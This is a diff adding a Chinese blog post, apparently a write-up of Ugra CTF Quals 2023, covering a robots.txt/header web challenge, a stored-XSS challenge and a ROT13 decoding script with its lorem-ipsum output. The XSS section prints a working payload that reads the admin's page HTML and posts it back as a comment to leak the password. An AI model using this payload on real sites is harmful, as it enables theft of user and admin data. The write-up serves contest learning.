@@ -1,0 +1,1571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+<script>
+(function(){
+    if(''){
+        if (prompt('请输入文章密码') !== ''){
+            alert('密码错误！');
+            history.back();
+        }
+    }
+})();
+</script>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/aixin.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/aixin.png">
+  <link rel="mask-icon" href="/images/aixin.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-big-counter.min.css">
+  <script src="true"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hzy2003628.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideLeftIn"}},"path":"search.xml"};
+  </script>
+
+
+
+<script>
+(function(){
+var src = "https://s.ssl.qhres2.com/ssl/ab77b6ea7f3fbf79.js";
+document.write('<script src="' + src + '" id="sozz"><\/script>');
+})();
+</script>
+
+
+
+
+<!-- title、keywords、desc关键字 -->
+
+  <title>微言</title>
+  <meta name="title" content="微言" />
+
+
+
+
+
+
+ <script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/b6dbddb6.js","daovoice")
+ daovoice('init', {
+  app_id: "6f081c2c"
+});
+daovoice('update');
+ </script>
+
+
+
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="Ugra CTF Quals 2023">
+<meta property="og:url" content="https://hzy2003628.top/2023/01/16/Ugra%20CTF%20Quals%202023/index.html">
+<meta property="og:site_name" content="风尘孤狼">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115214847796.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230116105218567.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115125443459.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115125456260.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115125506897.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115190212187.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115190258987.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115231539655.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115231659353.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115231718783.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115133628036.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115172318071.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115180833066.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115180907549.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115181041720.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192438442.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192524582.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192645166.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192702155.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115214308473.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115214449207.png?x-oss-process=hzy">
+<meta property="article:published_time" content="2023-01-16T05:27:31.000Z">
+<meta property="article:modified_time" content="2023-01-16T02:52:29.926Z">
+<meta property="article:author" content="故里">
+<meta property="article:tag" content="赛后复盘">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115214847796.png?x-oss-process=hzy">
+
+<link rel="canonical" href="https://hzy2003628.top/2023/01/16/Ugra%20CTF%20Quals%202023/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+
+
+  <title>Ugra CTF Quals 2023 | 风尘孤狼</title>
+  
+
+
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?d1ea9671a278a2cb33e24c76d08af22f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+
+<!-- 加入APlayer音乐播放器 -->
+<link rel="stylesheet" href="/dist/APlayer.min.css">
+<div id="aplayer"></div>
+<script type="text/javascript" src="/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="/dist/music.js"></script>
+
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">风尘孤狼</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">知识型学习记录</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">19</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">100</span></a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-love">
+
+    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>
+
+  </li>
+        <li class="menu-item menu-item-loveshow">
+
+    <a href="/LoveShow/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>LoveShow</a>
+
+  </li>
+        <li class="menu-item menu-item-whisper">
+
+    <a href="/Whisper/" rel="section"><i class="fa fa-calendar fa-fw"></i>微言</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzy2003628.top/2023/01/16/Ugra%20CTF%20Quals%202023/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="故里">
+      <meta itemprop="description" content="没有所谓失败，除非你不再尝试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="风尘孤狼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Ugra CTF Quals 2023
+        </h1>
+
+        <div class="post-meta">  
+		 
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-01-16 13:27:31 / 修改时间：10:52:29" itemprop="dateCreated datePublished" datetime="2023-01-16T13:27:31+08:00">2023-01-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">赛后复盘</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2023/01/16/Ugra%20CTF%20Quals%202023/" class="post-meta-item leancloud_visitors" data-flag-title="Ugra CTF Quals 2023" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/01/16/Ugra%20CTF%20Quals%202023/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/01/16/Ugra%20CTF%20Quals%202023/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>32k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>29 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115214847796.png?x-oss-process=hzy" alt="image-20230115214847796"></p>
+<span id="more"></span>
+<h1 id="前言">前言</h1>
+<p>国外一比赛，质量很高，学习一下，和对象一块打了半天，第69名</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230116105218567.png?x-oss-process=hzy" alt="image-20230116105218567"></p>
+<h1 id="web">WEB</h1>
+<h2 id="трисекция">Трисекция</h2>
+<blockquote>
+<p>Три, три, три — будет?..</p>
+<p><em>Обновлено 14 января в 14:05:</em> Задание немного упрощено — мы кое-что добавили.</p>
+</blockquote>
+<p>基础web题目，考察三部分内容，robots，http头，以及源码</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115125443459.png?x-oss-process=hzy" alt="image-20230115125443459">、</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115125456260.png?x-oss-process=hzy" alt="image-20230115125456260"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115125506897.png?x-oss-process=hzy" alt="image-20230115125506897"></p>
+<p>第二部分提示是覆盖root下的robots.txt，即访问域名直接的robots.txt即可</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115190212187.png?x-oss-process=hzy" alt="image-20230115190212187"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115190258987.png?x-oss-process=hzy" alt="image-20230115190258987"></p>
+<p>得到flag</p>
+<p>ugra_triangles_are_cool_but_triflags_are_way_cooler_a5700fd552c0</p>
+<h2 id="старые-добрые-времена">Старые добрые времена</h2>
+<blockquote>
+<p>Вася завел блог. Как полагается начинающему разработчику, написал он его с нуля. Покажите Васе, что он неправ.</p>
+<p><em>Добавлено 15 января в 01:45:</em></p>
+<p><strong>Подсказка.</strong> Флаг — пароль администратора.</p>
+</blockquote>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115231539655.png?x-oss-process=hzy" alt="image-20230115231539655"></p>
+<p>一个评论系统，可以留言，XSS漏洞，利用XMLHttpRequest，模拟管理员发送贴，同时带出来admin自己这个页面的信息</p>
+<pre><code class="hljs plaintext">&lt;script&gt;
+var test= window.btoa(encodeURI(document.getElementsByTagName(&#x27;html&#x27;)[0].outerHTML));
+x=new XMLHttpRequest();
+x.open(&quot;POST&quot;,&quot;https://goodolddays.q.2023.ugractf.ru/y878adr0tffsr42v/post&quot;);
+x.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+x.send(&#x27;author=123&amp;content=&#x27;+test);
+&lt;/script&gt;</code></pre>
+<p>得到</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115231659353.png?x-oss-process=hzy" alt="image-20230115231659353"></p>
+<p>url解码得到password即flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115231718783.png?x-oss-process=hzy" alt="image-20230115231718783"></p>
+<p>ugra_stop_reinventing_the_wheel_8czeakgizqrd</p>
+<h1 id="crypto">CRYPTO</h1>
+<h2 id="водоворот">Водоворот</h2>
+<blockquote>
+<p>Это сообщение зашифровано 1337 раундами алгоритма ROT-13.</p>
+</blockquote>
+<p>将题目附件里的内容使用rot13加密1337次，用脚本解密1337次保存一下即可</p>
+<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rot13</span>(<span class="hljs-params">s</span>):
+    result = <span class="hljs-string">&quot;&quot;</span>
+    <span class="hljs-comment"># Loop over characters.</span>
+    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> s:
+        <span class="hljs-comment"># Convert to number with ord.</span>
+        c = <span class="hljs-built_in">ord</span>(v)
+        <span class="hljs-comment"># Shift number back or forward.</span>
+        <span class="hljs-keyword">if</span> c &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>):
+            <span class="hljs-keyword">if</span> c &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;m&#x27;</span>):
+                c -= <span class="hljs-number">13</span>
+            <span class="hljs-keyword">else</span>:
+                c += <span class="hljs-number">13</span>
+        <span class="hljs-keyword">elif</span> c &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>):
+            <span class="hljs-keyword">if</span> c &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;M&#x27;</span>):
+                c -= <span class="hljs-number">13</span>
+            <span class="hljs-keyword">else</span>:
+                c += <span class="hljs-number">13</span>
+        <span class="hljs-comment"># Append to result.</span>
+        result += <span class="hljs-built_in">chr</span>(c)
+    <span class="hljs-comment"># Return transformation.</span>
+    <span class="hljs-keyword">return</span> result
+
+<span class="hljs-comment"># 将一段话进行rot13解密1337次</span>
+s1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ciphertext.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)
+s=s1.read()
+<span class="hljs-built_in">print</span>(s)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1337</span>):
+    s = rot13(s)
+
+<span class="hljs-comment"># 保存结果</span>
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
+    f.write(s)</code></pre>
+<p>保存之后的内容如下</p>
+<blockquote>
+<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean non aliquam eros. Curabitur non ullamcorper justo. Suspendisse auctor placerat accumsan. Nam vitae posuere augue. Donec sodales porta egestas. Nunc tincidunt, enim in luctus tincidunt, velit turpis tincidunt quam, sit amet vehicula mi diam nec nibh. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Phasellus venenatis a nulla eu sagittis. Nam faucibus convallis erat at iaculis. Maecenas mollis nunc quis gravida imperdiet.</p>
+<p>Vivamus in laoreet enim. Curabitur justo mauris, gravida vel neque vitae, aliquet hendrerit augue. Aenean mi purus, fringilla ut consectetur ac, ornare ut erat. Suspendisse in justo sit amet augue suscipit hendrerit. Morbi pretium lorem quam, ut porttitor est maximus vel. Praesent quis porttitor eros, ut finibus augue. Aenean et rhoncus nisl. Nulla facilisi. Mauris sodales ipsum et turpis ullamcorper, eget facilisis ligula accumsan.</p>
+<p>Aenean varius nisl mattis, hendrerit ligula quis, convallis lacus. Suspendisse purus sem, pulvinar ultrices luctus ut, vulputate eget nisi. Praesent bibendum rutrum hendrerit. Integer fermentum nisl eu sapien varius tincidunt ut non dolor. Mauris id lorem libero. Curabitur ullamcorper, lacus eu tristique ultricies, ligula risus pulvinar justo, nec mattis lacus lectus quis quam. Aliquam erat volutpat. Curabitur non felis enim. Fusce tincidunt, erat sit amet finibus volutpat, ligula libero finibus turpis, in ultricies mauris ante sed purus. Integer fermentum venenatis quam, molestie luctus nisl vehicula ut. Pellentesque tincidunt lectus interdum, ultrices neque vel, suscipit turpis. Pellentesque erat diam, sagittis eu lectus vitae, malesuada finibus tortor. Aenean id egestas augue, sit amet fermentum ipsum. Curabitur consectetur lacinia risus eu tempor. Vestibulum vitae nibh vel purus ultricies aliquet. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</p>
+<p>Etiam maximus, elit non varius porta, risus neque ornare nisl, ut dapibus purus eros quis magna. Donec eget erat sit amet massa malesuada feugiat id sit amet lectus. In commodo vehicula dolor, quis laoreet neque varius sit amet. Vestibulum vitae auctor nisi. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Aenean vitae luctus turpis, vel dapibus purus. Suspendisse potenti. Pellentesque est ex, egestas in turpis non, accumsan venenatis dui. Morbi cursus lacus risus, ac congue odio porta vitae. Fusce pulvinar semper lorem, egestas iaculis lorem condimentum nec. Nullam tellus magna, dapibus quis fermentum eget, sodales vel turpis. Quisque quis dui nisi. Duis sollicitudin leo nec ultricies porttitor. Proin dapibus libero ornare magna consectetur tristique.</p>
+<p>Donec et fringilla enim. Donec ut massa ultricies arcu venenatis ultricies. Ut ut congue eros. Maecenas ornare lobortis metus, luctus gravida ligula sodales non. Vivamus condimentum ut dui vel fringilla. Fusce ut odio sit amet nibh lacinia malesuada. Donec velit tortor, ullamcorper in erat et, cursus euismod arcu. Nam vitae justo in tortor laoreet bibendum vitae vitae enim. Sed ac ultricies turpis. Pellentesque luctus commodo molestie. Vestibulum ac pulvinar massa.</p>
+<p>Proin nisl nulla, commodo eget vulputate eu, scelerisque in velit. Fusce elementum in augue ac blandit. Vestibulum id dictum massa. Nullam pulvinar dolor sit amet neque sodales condimentum. Mauris pulvinar fermentum leo, quis viverra nulla aliquet et. Nulla at nisi ultricies, auctor nibh a, elementum est. Suspendisse mattis pellentesque dui. Cras ullamcorper lacus ut urna feugiat laoreet congue eget lacus. Aliquam maximus arcu eu urna ornare, id bibendum purus molestie. Etiam hendrerit mollis egestas.</p>
+<p>Curabitur sollicitudin nunc ac odio tempus, sit amet placerat tellus sodales. Pellentesque vitae tellus ac diam gravida venenatis. Fusce gravida, nulla in malesuada blandit, libero ipsum porttitor ante, eu scelerisque nunc odio quis velit. Nam sit amet enim in odio ultrices posuere. Duis iaculis consectetur dui. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Nulla ut risus augue. Nam consectetur interdum nisl, ut ultricies ipsum egestas sed.</p>
+<p>Etiam eu diam at sapien tincidunt rutrum quis non est. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Etiam bibendum dignissim purus ac placerat. Cras ullamcorper, mi egestas lacinia faucibus, turpis erat tincidunt tortor, ut volutpat turpis ex vitae dolor. Nam imperdiet dolor sit amet lorem vestibulum, eu condimentum mi iaculis. Ut viverra nisi a ultricies pretium. Maecenas cursus lacus condimentum lectus convallis scelerisque. Sed pretium enim nec ligula consequat, eu venenatis enim efficitur. Pellentesque eros turpis, semper in massa quis, blandit pretium tortor. Nam sodales dignissim accumsan. Donec vitae nulla porta, varius augue nec, aliquam neque. Donec non aliquet nisl, euismod hendrerit est. Maecenas id ultrices metus, id pharetra mauris. Phasellus ut vulputate ante, a fermentum quam.</p>
+<p>Nam rutrum ex non sapien facilisis, id cursus ante sollicitudin. Integer fringilla ugra_double_security_for_only_50_more_bucks_o2nvw9n27bgj consequat pellentesque. Aliquam elementum, neque in euismod luctus, nisi urna dictum ante, non imperdiet dui lorem accumsan leo. Curabitur metus arcu, vestibulum eget rhoncus a, luctus id velit. Nulla egestas libero nisi, vitae dictum risus ultricies vitae. Sed sit amet iaculis lorem. Ut mi purus, porttitor at euismod sed, porta ac massa. Nulla aliquet vel felis ac mattis. Duis erat urna, consectetur id sollicitudin at, vehicula et sapien. Morbi id mauris finibus, ullamcorper sem sed, ultrices libero.</p>
+<p>Aliquam nulla metus, mollis et ex id, suscipit eleifend nisl. Proin sagittis lacus quis sodales tincidunt. Donec aliquet leo nibh, eu vehicula risus lacinia at. Nam at interdum massa. In feugiat, libero ut dignissim fringilla, arcu felis imperdiet dolor, a commodo diam quam sed libero. Phasellus placerat, lectus et euismod tristique, dolor erat vehicula tortor, in euismod ligula neque id lectus. Pellentesque vitae interdum lectus, ac tristique erat. Duis mi risus, tristique eu turpis at, congue pharetra purus. Cras risus leo, facilisis a venenatis id, mollis vel nisl.</p>
+<p>Phasellus vel ligula feugiat lacus faucibus posuere quis nec massa. Suspendisse ante velit, elementum at dignissim vitae, dignissim a quam. Nunc ultrices metus in neque facilisis mattis. Ut mattis arcu velit, sit amet venenatis arcu iaculis ac. Fusce tempus sed erat vitae molestie. Maecenas posuere sit amet erat nec convallis. Fusce massa erat, pretium ut pellentesque in, porttitor varius sapien. Suspendisse lacus felis, tincidunt sed velit vel, blandit sodales libero. Aenean et nisl tellus. Etiam tristique metus quis ex pharetra viverra. Fusce quis mi facilisis, rhoncus enim a, congue orci. Duis auctor eros felis, a semper mauris congue eget. Fusce vehicula cursus quam sit amet auctor. Aenean aliquam, ipsum interdum elementum tempor, ante ex lobortis ex, egestas rhoncus velit diam et velit.</p>
+<p>Ut consectetur tempor nibh, laoreet feugiat eros facilisis vel. Vestibulum a ligula metus. Pellentesque vehicula est nulla, facilisis dignissim magna varius quis. Phasellus hendrerit egestas risus quis accumsan. Pellentesque quis vulputate mauris. Donec quis congue felis. Sed id ex nisi. Curabitur a scelerisque arcu. Ut consequat laoreet nisl, eu aliquet risus semper at. Phasellus blandit metus eget ornare euismod. Phasellus lacinia magna quis consequat dapibus. Pellentesque tincidunt eros nec metus varius, quis finibus quam tempor. In maximus pretium nunc. Praesent id eros auctor, finibus nunc sed, commodo odio. Vivamus placerat laoreet est, nec elementum odio ultricies eu. Aliquam congue sem quis porta commodo.</p>
+<p>Vestibulum iaculis scelerisque dolor, eget eleifend tortor bibendum condimentum. Fusce suscipit mi id sodales venenatis. Mauris ac imperdiet leo. Vivamus vitae consequat mauris, in pharetra orci. Proin in nibh ligula. Integer a varius erat. Proin euismod metus massa, ultricies suscipit ex posuere mollis. Suspendisse potenti. Phasellus ut diam ipsum. Sed arcu turpis, venenatis id vulputate vitae, ultricies non massa. Donec eget magna eget elit pharetra feugiat ac eget mi. Nam scelerisque metus massa, vitae eleifend turpis maximus eu. Curabitur aliquam odio et neque facilisis venenatis vitae sit amet massa.</p>
+<p>Sed cursus nisi eu lorem pharetra ullamcorper. Ut pulvinar, sem a eleifend ultrices, sapien tellus sagittis justo, at sollicitudin dolor neque suscipit ex. Nulla consectetur elit elit, non faucibus diam sollicitudin non. Morbi iaculis tempus enim, porta fringilla enim auctor eu. Curabitur luctus lacinia mauris, non faucibus metus tempor rutrum. Fusce at egestas ligula, ac euismod diam. In sed blandit mi. Quisque fringilla consequat tellus. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Ut nec turpis elit.</p>
+<p>Aenean luctus magna quis risus ullamcorper, at vestibulum ligula suscipit. Quisque venenatis lectus est. Duis euismod feugiat dolor vehicula consequat. Aliquam eu sapien libero. Morbi sit amet feugiat mi. Nullam sed lectus vel tellus sodales vehicula ut quis lorem. Suspendisse gravida, arcu id bibendum consequat, sapien massa tempus dui, sed vehicula ex dui nec purus. Nulla facilisi. Quisque finibus maximus placerat. Curabitur pulvinar est et gravida accumsan. Integer in hendrerit est. Nunc ac quam arcu. Aliquam erat volutpat. Mauris purus diam, consequat in velit dictum, cursus ultrices neque. Vestibulum luctus malesuada efficitur. Praesent aliquet elementum congue.</p>
